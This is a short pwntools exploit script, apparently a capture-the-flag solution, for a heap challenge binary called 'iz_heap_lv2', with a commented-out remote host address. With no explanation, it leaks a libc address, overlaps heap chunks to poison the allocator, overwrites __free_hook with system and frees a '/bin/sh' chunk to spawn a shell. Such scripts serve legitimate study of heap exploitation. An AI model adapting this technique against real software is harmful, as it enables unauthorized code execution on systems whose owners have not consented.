from pwn import *

p=process("./iz_heap_lv2")
#p=remote("165.22.110.249",4444)

sa = lambda x,y : p.sendafter(x,y)
ch = lambda x : sa("Choice",str(x))
go = lambda : p.interactive()

def add(size,data):
    ch(1)
    sa("size",str(size))
    sa("data",data)

def edit(idx,data):
    ch(2)
    sa("index",str(idx))
    sa('data',data)

def delete(idx):
    ch(3)
    sa("index",str(idx))

def show(idx):
    ch(4)
    sa("index",str(idx))

for i in range(8):
    add(0x100,str(i)*0x100)
add(0x30,"GUARD")
for i in range(8):
    delete(i)
for i in range(8):
    add(0x100,"1"*8)
show(7)
p.recvuntil("1"*8)
lb = u64(p.recvline()[:-1]+'\x00'*2)-0x3ebca0
fh = lb+0x3ed8e8
system = lb+0x4f440
print hex(lb)

for i in range(8):
    add(0xf8,str(i)*0xf8)
add(0x38,"VIC")
add(0xf8,str(i)*0xf8)
add(0x30,"GUARD2")

for i in range(8):
    delete(9+i)

edit(17,"A"*0x30+p64(0x40+0x100))
delete(17)
delete(18)

add(0xd0,"A"*0xd0)
add(0x50,p64(fh)*10)
add(0x30,"/bin/sh\x00")
add(0x30,p64(system))
delete(11)
go()
